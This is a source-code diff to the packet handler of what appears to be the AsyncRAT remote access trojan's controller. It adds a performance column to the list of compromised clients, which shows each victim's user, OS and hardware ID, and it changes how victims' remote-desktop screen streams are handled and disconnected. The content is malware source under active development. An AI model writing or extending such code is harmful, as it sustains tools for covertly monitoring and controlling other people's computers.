@@ -38,6 +38,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                 Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                                 Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                                 Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
+                                Client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Performance").AsString);
                                 Client.LV.ToolTipText = unpack_msgpack.ForcePathObject("Path").AsString;
                                 Client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                                 Program.form1.listView1.Items.Insert(0, Client.LV);
@@ -52,7 +53,16 @@ namespace AsyncRAT_Sharp.Handle_Packet
 
                     case "Ping":
                         {
-                            Debug.WriteLine(unpack_msgpack.ForcePathObject("Message").AsString);
+                            if (Program.form1.listView1.InvokeRequired)
+                            {
+                                Program.form1.listView1.BeginInvoke((MethodInvoker)(() =>
+                                {
+                                    if (Client.LV != null)
+                                    {
+                                        Client.LV.SubItems[Program.form1.lv_prefor.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString;
+                                    }
+                                }));
+                            }
                         }
                         break;
 
@@ -94,10 +104,10 @@ namespace AsyncRAT_Sharp.Handle_Packet
                             {
                                 Program.form1.BeginInvoke((MethodInvoker)(() =>
                                 {
-                                    RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + Client.ID];
+                                    RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
                                     try
                                     {
-                                        if (RD != null && RD.Active == true)
+                                        if (RD != null)
                                         {
                                             byte[] RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                                             Bitmap decoded = RD.decoder.DecodeData(new MemoryStream(RdpStream));
@@ -117,10 +127,12 @@ namespace AsyncRAT_Sharp.Handle_Packet
                                         }
                                         else
                                         {
-                                            MsgPack msgpack = new MsgPack();
-                                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                                            msgpack.ForcePathObject("Option").AsString = "false";
-                                            Client.BeginSend(msgpack.Encode2Bytes());
+                                            //MsgPack msgpack = new MsgPack();
+                                            //msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                                            //msgpack.ForcePathObject("Option").AsString = "false";
+                                            //Client.BeginSend(msgpack.Encode2Bytes());
+                                            Client.Disconnected();
+                                            return;
                                         }
                                     }
                                     catch (Exception ex) { Debug.WriteLine(ex.Message); }
@@ -335,11 +347,12 @@ namespace AsyncRAT_Sharp.Handle_Packet
                         }
                 }
             }
-
             catch (Exception ex)
             {
                 Debug.WriteLine(ex.Message);
             }
+            GC.Collect();
+            GC.WaitForPendingFinalizers();
         }
     }
 }
